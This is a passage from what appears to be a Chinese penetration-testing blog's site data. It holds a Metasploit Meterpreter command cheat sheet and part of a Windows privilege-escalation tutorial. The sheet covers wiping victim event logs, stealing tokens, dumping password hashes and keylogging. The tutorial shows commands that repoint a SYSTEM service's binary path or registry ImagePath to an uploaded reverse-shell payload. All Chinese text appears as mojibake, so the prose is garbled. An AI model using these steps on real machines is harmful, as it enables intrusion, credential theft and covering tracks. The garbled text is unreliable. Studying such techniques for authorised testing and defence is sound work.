åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ³¨é‡Š<br>services åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æœåŠ¡<br>vulns åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ¼æ´<br>workspace åœ¨æ•°æ®åº“å·¥ä½œåŒºä¹‹é—´åˆ‡æ¢<br>å‡­æ®åç«¯å‘½ä»¤<br>creds åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰å‡­æ®<br>æ¨¡å—å‘½ä»¤<br>Advanced æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„é«˜çº§é€‰é¡¹<br>Back ä»å½“å‰ä¸Šä¸‹æ–‡è¿”å›<br>Edit ä½¿ç”¨é¦–é€‰ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰æ¨¡å—<br>info æ˜¾ç¤ºæœ‰å…³ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„ä¿¡æ¯<br>loadpath è·¯å¾„ä»è·¯å¾„æœç´¢å¹¶åŠ è½½æ¨¡å—<br>options æ˜¾ç¤ºå…¨å±€é€‰é¡¹æˆ–ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—<br>popm å°†æœ€æ–°çš„æ¨¡å—ä»å †æ ˆä¸­å¼¹å‡ºå¹¶ä½¿å…¶å¤„äºæ´»åŠ¨çŠ¶æ€<br>previous å°†ä¹‹å‰åŠ è½½çš„æ¨¡å—è®¾ç½®ä¸ºå½“å‰æ¨¡å—<br>pushm å°†æ´»åŠ¨æˆ–æ¨¡å—åˆ—è¡¨æ¨å…¥æ¨¡å—å †æ ˆ<br>reload_all ä»æ‰€æœ‰å®šä¹‰çš„æ¨¡å—è·¯å¾„é‡æ–°åŠ è½½æ‰€æœ‰æ¨¡å—<br>search æœç´¢æ¨¡å—åç§°å’Œæè¿°<br>show æ˜¾ç¤ºç»™å®šç±»å‹çš„æ¨¡å—æˆ–æ‰€æœ‰æ¨¡å—<br>use æŒ‰åç§°é€‰æ‹©æ¨¡å—<br>enumdesktops #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢<br>getdesktop #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢<br>setdesktop #è®¾ç½®meterpreterå…³è”çš„æ¡Œé¢ -hæŸ¥çœ‹å¸®åŠ©<br>screenshot #æˆªå±<br>run vnc #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥<br></code></pre></td></tr></table></figure><h2 id="æ‹¿åˆ°meterepreterå"><a href="#æ‹¿åˆ°Meterepreterå" class="headerlink" title="æ‹¿åˆ°Meterepreterå"></a>æ‹¿åˆ°Meterepreterå</h2><p><strong>ç³»ç»Ÿå‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">clearav -æ¸…é™¤äº†å—å®³è€…çš„è®¡ç®—æœºä¸Šçš„äº‹ä»¶æ—¥å¿—<br>drop_token -è¢«ç›—çš„ä»¤ç‰Œ<br>execute-æ‰§è¡Œå‘½ä»¤<br>getpid -è·å–å½“å‰è¿›ç¨‹ ID (PID)<br>getprivs -å°½å¯èƒ½è·å–å°½å¯èƒ½å¤šçš„ç‰¹æƒ<br>getuid -è·å–ä½œä¸ºè¿è¡ŒæœåŠ¡å™¨çš„ç”¨æˆ·<br>kill -ç»ˆæ­¢æŒ‡å®š PID çš„è¿›ç¨‹<br>ps -åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹<br>reboot-é‡æ–°å¯åŠ¨å—å®³äººçš„è®¡ç®—æœº<br>reg -ä¸å—å®³äººçš„æ³¨å†Œè¡¨è¿›è¡Œäº¤äº’<br>rev2self -åœ¨å—å®³è€…æœºå™¨ä¸Šè°ƒç”¨ RevertToSelf()<br>shell -åœ¨å—å®³è€…è®¡ç®—æœºä¸Šæ‰“å¼€ä¸€ä¸ªshell<br>shutdown-å…³é—­äº†å—å®³è€…çš„è®¡ç®—æœº<br>steal_token -è¯•å›¾çªƒå–æŒ‡å®šçš„ (PID) è¿›ç¨‹çš„ä»¤ç‰Œ<br>sysinfo -è·å–æœ‰å…³å—å®³è€…è®¡ç®—æœºæ“ä½œç³»ç»Ÿå’Œåç§°ç­‰çš„è¯¦ç»†ä¿¡æ¯<br>sessions -æŸ¥çœ‹å½“å‰çš„ä¼šè¯<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æƒå‡çº§å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">getprivs -å°½å¯èƒ½æå‡æƒé™<br>getsystem -è·å¾—ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼Œé€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™<br>//ä¸è¿‡è¿™ä¸¤ç§æ–¹å¼æœ‰æ—¶å€™ä¸ä¸€å®šå¯ä»¥<br></code></pre></td></tr></table></figure><p><strong>å¯†ç è½¬å‚¨å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hashdump -æŠ“å–å“ˆå¸Œå¯†ç  (SAM) æ–‡ä»¶ä¸­çš„å€¼<br></code></pre></td></tr></table></figure><p><strong>ç”¨æˆ·ç•Œé¢å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">enumdesktops -åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®å°å¼æœº<br>getdesktop -è·å–å½“å‰çš„ meterpreter æ¡Œé¢<br>idletime -æ£€æŸ¥é•¿æ—¶é—´ä»¥æ¥ï¼Œå—å®³è€…ç³»ç»Ÿç©ºé—²è¿›ç¨‹<br>keyscan_dump -é”®ç›˜è®°å½•è½¯ä»¶çš„å†…å®¹è½¬å‚¨<br>keyscan_start -å¯åŠ¨æ—¶ä¸å¦‚ Word æˆ–æµè§ˆå™¨çš„è¿›ç¨‹ç›¸å…³è”çš„é”®ç›˜è®°å½•è½¯ä»¶<br>keyscan_stop -åœæ­¢é”®ç›˜è®°å½•è½¯ä»¶<br>screenshot-æŠ“å» meterpreter æ¡Œé¢çš„å±å¹•æˆªå›¾<br>set_desktop -æ›´æ”¹ meterpreter æ¡Œé¢<br>uictl -å¯ç”¨ç”¨æˆ·ç•Œé¢ç»„ä»¶çš„ä¸€äº›æ§ä»¶<br></code></pre></td></tr></table></figure><p><strong>ç½‘ç»œå‘½ä»¤</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig -æ˜¾ç¤ºç½‘ç»œæ¥å£çš„å…³é”®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IP åœ°å€ã€ ç­‰ã€‚<br>portfwd -ç«¯å£è½¬å‘<br>route -æŸ¥çœ‹æˆ–ä¿®æ”¹å—å®³è€…è·¯ç”±è¡¨<br></code></pre></td></tr></table></figure><p><strong>æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat -è¯»å–å¹¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæ–‡ä»¶çš„å†…å®¹<br>cd -æ›´æ”¹ç›®å½•å¯¹å—å®³äºº<br>del -åˆ é™¤æ–‡ä»¶å¯¹å—å®³äºº<br>download-ä»å—å®³è€…ç³»ç»Ÿæ–‡ä»¶ä¸‹è½½<br>edit-ç”¨ vimç¼–è¾‘æ–‡ä»¶<br>getlwd -æ‰“å°æœ¬åœ°ç›®å½•<br>getwd -æ‰“å°å·¥ä½œç›®å½•<br>lcd -æ›´æ”¹æœ¬åœ°ç›®å½•<br>lpwd -æ‰“å°æœ¬åœ°ç›®å½•<br>ls -åˆ—å‡ºåœ¨å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨<br>mkdir -åœ¨å—å®³è€…ç³»ç»Ÿä¸Šçš„åˆ›å»ºç›®å½•<br>pwd -è¾“å‡ºå·¥ä½œç›®å½•<br>rm -åˆ é™¤æ–‡ä»¶<br>rmdir -å—å®³è€…ç³»ç»Ÿä¸Šåˆ é™¤ç›®å½•<br>upload-ä»æ”»å‡»è€…çš„ç³»ç»Ÿå¾€å—å®³è€…ç³»ç»Ÿä¸Šä¼ æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><strong>å¸®åŠ©èœå•</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">background â€“ å°†å½“å‰ä¼šè¯ç§»åŠ¨åˆ°èƒŒæ™¯<br>bgkill â€“ æ€æ­»ä¸€ä¸ªèƒŒæ™¯ meterpreter è„šæœ¬<br>bglist â€“ æä¾›æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬çš„åˆ—è¡¨<br>bgrun â€“ ä½œä¸ºä¸€ä¸ªåå°çº¿ç¨‹è¿è¡Œè„šæœ¬<br>channel â€“ æ˜¾ç¤ºæ´»åŠ¨é¢‘é“<br>close â€“ å…³é—­é€šé“<br>exit â€“ ç»ˆæ­¢ meterpreter ä¼šè¯<br>help â€“ å¸®åŠ©èœå•<br>interact â€“ ä¸é€šé“è¿›è¡Œäº¤äº’<br>irb â€“ è¿›å…¥ Ruby è„šæœ¬æ¨¡å¼<br>migrate â€“ ç§»åŠ¨åˆ°ä¸€ä¸ªæŒ‡å®šçš„ PID çš„æ´»åŠ¨è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯æ³¨å…¥è¿›ç¨‹<br>quit â€“ ç»ˆæ­¢ meterpreter ä¼šè¯<br>read â€“ ä»é€šé“è¯»å–æ•°æ®<br>run â€“ æ‰§è¡Œä»¥åå®ƒé€‰å®šçš„ meterpreter è„šæœ¬<br>use â€“ åŠ è½½ meterpreter çš„æ‰©å±•<br>write â€“ å°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªé€šé“<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-æƒé™æå‡</title>
      <link href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æƒé™æå‡å¯ä»¥åˆ†ä¸ºæ¨ªå‘æƒé™æå‡å’Œå‚ç›´æƒé™æå‡ï¼Œå‰è€…æ˜¯æŒ‡åŒçº§ç”¨æˆ·ï¼Œåè€…æ˜¯æŒ‡ä½çº§ç”¨æˆ·åˆ°é«˜çº§ç”¨æˆ·ã€‚</p></blockquote><h1 id="ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ"><a href="#ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ" class="headerlink" title="ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ"></a>ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ</h1><p>å½“ç›®æ ‡ç³»ç»Ÿå­˜åœ¨è¯¥æ¼æ´ä¸”æ²¡æœ‰æ›´æ–°å®‰å…¨è¡¥ä¸æ—¶ï¼Œåˆ©ç”¨å·²çŸ¥çš„ç³»ç»Ÿå†…æ ¸æ¼æ´è¿›è¡Œææƒæµ‹è¯•äººå‘˜å¾€å¾€å¯ä»¥è·å¾—ç³»ç»Ÿçº§åˆ«çš„è®¿é—®æƒé™ã€‚</p><h2 id="æŸ¥æ‰¾æ¼æ´"><a href="#æŸ¥æ‰¾æ¼æ´" class="headerlink" title="æŸ¥æ‰¾æ¼æ´"></a>æŸ¥æ‰¾æ¼æ´</h2><p><strong>æ‰‹åŠ¨æŸ¥æ‰¾</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨è¯¥å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸</p><p><img src="http://cdn.clown2024.cn/202407151448392.png" alt="image-20240326091200716"></p><p>ç„¶åå¯ä»¥ç»“åˆç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼Œå€ŸåŠ©è¾…åŠ©å·¥å…·å¯»æ‰¾å¯ç”¨çš„ææƒæ¼æ´ã€‚</p><p><strong>å€ŸåŠ©WES-NGæŸ¥æ‰¾å¯ç”¨æ¼æ´</strong></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æ›´æ–°æ¼æ´åº“æ•°æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py --update<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448393.png" alt="image-20240326092255515"></p></li><li><p>åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œsysteminfoå‘½ä»¤ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°sysinfo.txtä¸­ï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œç”¨WES-NGè¿›è¡Œæ£€æŸ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--impactæŒ‡å®šæ¼æ´ç±»å‹ä¸ºææƒæ¼æ´</span><br></code></pre></td></tr></table></figure><p>emmmæˆ‘çš„win7systeminfoæ–‡ä»¶è·‘å‡ºæ¥ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè·‘äº†ä¸€ä¸‹æˆ‘çš„win11ç«Ÿç„¶æœ‰cveæ²¡ç»·ä½</p><p><img src="http://cdn.clown2024.cn/202407151448394.png" alt="image-20240326160918537"></p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æŸ¥æ‰¾æ‰€æœ‰å·²å…¬å¼€EXPçš„ææƒæ¼æ´</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448395.png" alt="image-20240326161002020"></p></li></ol><h2 id="ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´"><a href="#ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´" class="headerlink" title="ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´"></a>ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´</h2><p>ç¡®å®šæ¼æ´ä¹‹åï¼Œå°±å»æ‰¾åˆ©ç”¨ç¨‹åºç„¶åä¸Šä¼ åˆ©ç”¨è¿›è¡Œææƒã€‚</p><h1 id="ç³»ç»ŸæœåŠ¡ææƒ"><a href="#ç³»ç»ŸæœåŠ¡ææƒ" class="headerlink" title="ç³»ç»ŸæœåŠ¡ææƒ"></a>ç³»ç»ŸæœåŠ¡ææƒ</h1><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·å®‰è£…çš„ä¸€äº›åº”ç”¨è½¯ä»¶ä¼šåœ¨æœ¬åœ°æ³¨å†Œä¸€äº›æœåŠ¡ï¼Œå¹¶ä¸”å¤§å¤šæ•°æœåŠ¡åœ¨è®¡ç®—æœºå¼€æœºæ—¶ä»¥ç³»ç»ŸSYSTEM æƒé™å¯åŠ¨ã€‚åº”ç”¨è½¯ä»¶åœ¨æ³¨å†ŒæœåŠ¡æ—¶ï¼Œä¼šåœ¨ä»¥ä¸‹è·¯å¾„ä¸­åˆ›å»ºç›¸åº”çš„æ³¨å†Œè¡¨é¡¹,è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448396.png" alt="image-20240327103308958"></p><p>å…¶ä¸­çš„ImagePathæŒ‡å‘å¯åŠ¨ç³»ç»ŸæœåŠ¡çš„äºŒè¿›åˆ¶ç¨‹åºè·¯å¾„</p><p><img src="http://cdn.clown2024.cn/202407151448397.png" alt="image-20240327103611189"></p><p>å¦‚æœè®©æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œè¯¥ç¨‹åºå°±å¯ä»¥éšç€æœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ï¼Œè¿™æ˜¯åˆ©ç”¨ç³»ç»ŸæœåŠ¡ææƒçš„ä¸»è¦æ€è·¯ã€‚</p><h2 id="ä¸å®‰å…¨çš„æœåŠ¡æƒé™"><a href="#ä¸å®‰å…¨çš„æœåŠ¡æƒé™" class="headerlink" title="ä¸å®‰å…¨çš„æœåŠ¡æƒé™"></a>ä¸å®‰å…¨çš„æœåŠ¡æƒé™</h2><p>ACL å®šä¹‰äº†å®‰å…¨å¯¹è±¡çš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œç”¨äºè§„å®šå“ªäº›ä¸»ä½“å¯¹å…¶æ‹¥æœ‰è®¿é—®æƒé™å’Œæ‹¥æœ‰ä»€ä¹ˆæ ·çš„æƒé™ã€‚Windows çš„ç³»ç»ŸæœåŠ¡æ­£æ˜¯é€šè¿‡ ACL æ¥æŒ‡å®šç”¨æˆ·å¯¹å…¶æ‹¥æœ‰çš„æƒé™ï¼Œå¸¸è§çš„æƒé™åˆ—è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th>æƒé™</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SERVICE_START</td><td>å¯åŠ¨æœåŠ¡çš„æƒé™</td></tr><tr><td>SERVICE_STOP</td><td>åœæ­¢æœåŠ¡çš„æƒé™</td></tr><tr><td>SERVICE_PAUSE_CONTINUE</td><td>æš‚åœ&#x2F;ç»§ç»­è¿è¡ŒæœåŠ¡çš„æƒé™</td></tr><tr><td>SERVICE_QUERY_STATUS</td><td>æŸ¥è¯¢æœåŠ¡çŠ¶æ€çš„æƒé™</td></tr><tr><td>SERVICE_QUERY_CONFIG</td><td>æŸ¥è¯¢æœåŠ¡é…ç½®çš„æƒé™</td></tr><tr><td>SERVICE_CHANGE_CONFIG</td><td>æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™</td></tr><tr><td>SERVICE_ALL_ACCESS</td><td>å®Œå…¨æ§åˆ¶æƒé™</td></tr></tbody></table><p>å¦‚æœç”¨æˆ·åœ¨é…ç½®æœåŠ¡æ—¶ä½¿å¾—ä½æƒé™ç”¨æˆ·å¯¹é«˜æƒé™ä¸‹è¿è¡Œçš„ç³»ç»ŸæœåŠ¡æ‹¥æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¿®æ”¹ç³»ç»ŸæœåŠ¡å¯åŠ¨æ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ã€‚</p><blockquote><p>AccessChkå·¥å…·å¯ä»¥æšä¸¾ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨æƒé™ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡ã€‚AccessChkæ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„ç®¡ç†å·¥å…·ï¼Œå¸¸ç”¨æ¥æšä¸¾æˆ–æŸ¥çœ‹ç³»ç»Ÿä¸­æŒ‡å®šç”¨æˆ·ã€ç»„å¯¹ç‰¹å®šèµ„æº(åŒ…æ‹¬ä½†ä¸é™äºæ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨ã€å…¨å±€å¯¹è±¡å’Œç³»ç»ŸæœåŠ¡ç­‰)çš„è®¿é—®æƒé™ã€‚</p><p>å·¥å…·åœ°å€ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p></blockquote><p>ä½æƒé™ç”¨æˆ·å¯ä»¥æ£€æŸ¥â€œAuthenticated Usersâ€ç»„å’Œâ€œINTERACTIVEâ€ç»„å¯¹ç³»ç»ŸæœåŠ¡çš„æƒé™ã€‚å‰è€…ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨ç”¨æˆ·åã€å¯†ç ç™»å½•å¹¶é€šè¿‡èº«ä»½éªŒè¯çš„è´¦æˆ·ï¼Œä½†ä¸åŒ…æ‹¬æ¥å®¾è´¦æˆ·ï¼›åè€…ä¸ºäº¤äº’å¼ç”¨æˆ·ç»„ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ç›´æ¥ç™»å½•åˆ°è®¡ç®—æœºè¿›è¡Œæ“ä½œçš„ç”¨æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸¤ä¸ªç»„ä¸ºè®¡ç®—æœºæœ¬åœ°â€œUsersâ€ç»„çš„æˆå‘˜ã€‚</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æšä¸¾â€Authenticated Usersâ€ç»„æ˜¯å¦å…·æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uwcqv: è¿™äº›é€‰é¡¹è¡¨ç¤º AccessChk å°†ä»¥è¯¦ç»†æ ¼å¼æ˜¾ç¤ºå¯¹è±¡çš„å®‰å…¨æè¿°ç¬¦ä¿¡æ¯ã€‚æ¯ä¸ªé€‰é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š<br><br>u: æ˜¾ç¤ºæ‰€å±ç”¨æˆ·ï¼ˆOwnerï¼‰ä¿¡æ¯ã€‚<br>w: æ˜¾ç¤ºå­å¯¹è±¡çš„æƒé™ã€‚<br>c: æ˜¾ç¤ºæ‰€é€‰å¯¹è±¡çš„ACLï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ä¿¡æ¯ã€‚<br>q: é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºç»“æœè€Œä¸æ˜¾ç¤ºå¤´éƒ¨ä¿¡æ¯ã€‚<br>v: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><p>æˆ‘åœ¨æœ¬æœºæ²¡æœ‰æ‰¾åˆ°æœ‰æ›´æ”¹æƒé™çš„ç”¨æˆ·</p><p><img src="http://cdn.clown2024.cn/202407151448398.png" alt="image-20240327105943719"></p><p>ä»¥ä¹¦ä¸Šä¾‹å­åœ¨æ‰¾åˆ°æƒé™çš„æƒ…å†µä¸‹åº”è¯¥å¦‚ä½•åˆ©ç”¨ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151448399.png" alt="image-20240327112003498"></p><p>å¯ä»¥çœ‹åˆ°è¯¥ç»„å¯¹InsproSvcæœåŠ¡å…·æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¯¥æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æ”»å‡»è½½è·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">binpathï¼ŒæŒ‡å®šæœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œæ³¨æ„â€œ=â€åå¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448400.png" alt="image-20240327112213382"></p><p>å¦‚æœå½“å‰ç”¨æˆ·å¯¹è¯¥æœåŠ¡æ‹¥æœ‰SERVICE_STOPå’ŒSERVICE_STARTæƒé™ï¼Œå³æˆ‘ä»¬æ‹¥æœ‰å¯ä»¥é‡å¯æœåŠ¡çš„æƒé™</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc stop &lt;service name&gt;<br>sc start &lt;service name&gt;<br></code></pre></td></tr></table></figure><h2 id="æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±"><a href="#æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±" class="headerlink" title="æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±"></a>æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±</h2><p>Windows çš„æ³¨å†Œè¡¨ä¸­å­˜å‚¨äº†æ¯ä¸ªç³»ç»ŸæœåŠ¡çš„æ¡ç›®ï¼Œè€Œæ³¨å†Œè¡¨ä½¿ç”¨ ACL æ¥ç®¡ç†ç”¨æˆ·å¯¹å…¶æ‰€æ‹¥æœ‰çš„è®¿é—®æƒé™ã€‚å¦‚æœæ³¨å†Œè¡¨çš„ ACLé…ç½®é”™è¯¯ï¼Œä½¿å¾—ä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯¹æœåŠ¡çš„æ³¨å†Œè¡¨æ‹¥æœ‰å†™å…¥æƒé™ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ¥æ›´æ”¹æœåŠ¡é…ç½®ã€‚ä¾‹å¦‚ä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„ImagePathé”®ã€‚</p><ol><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æšä¸¾â€Authenticated Usersâ€æ˜¯å¦å…·æœ‰æœåŠ¡æ³¨å†Œè¡¨å†™å…¥æƒé™çš„ç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uvwqk: è¿™äº›é€‰é¡¹è¡¨ç¤º AccessChk å°†ä»¥è¯¦ç»†æ ¼å¼æ˜¾ç¤ºå¯¹è±¡çš„å®‰å…¨æè¿°ç¬¦ä¿¡æ¯ã€‚æ¯ä¸ªé€‰é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>u: æ˜¾ç¤ºæ‰€å±ç”¨æˆ·ï¼ˆOwnerï¼‰ä¿¡æ¯ã€‚<br>v: æ˜¾ç¤ºæ‰€é€‰å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>w: æ·±å…¥æ˜¾ç¤ºå­é¡¹çš„ä¿¡æ¯ï¼ˆé€’å½’æ£€æŸ¥ï¼‰ã€‚<br>q: é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºç»“æœè€Œä¸æ˜¾ç¤ºå¤´éƒ¨ä¿¡æ¯ã€‚<br>k: åŒæ„è®¸å¯è¯ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448401.png" alt="image-20240327214529644"></p></li><li><p>è¯¥ç”¨æˆ·ç»„å¯¹RegSvcæœåŠ¡çš„æ³¨å†Œè¡¨å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤å°†æ³¨å†Œè¡¨ä¸­çš„ImagePathé”®æŒ‡å‘æˆ‘ä»¬ä¸Šä¼ çš„æ”»å‡»è½½è·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/vï¼šæŒ‡å®šè¦æ·»åŠ 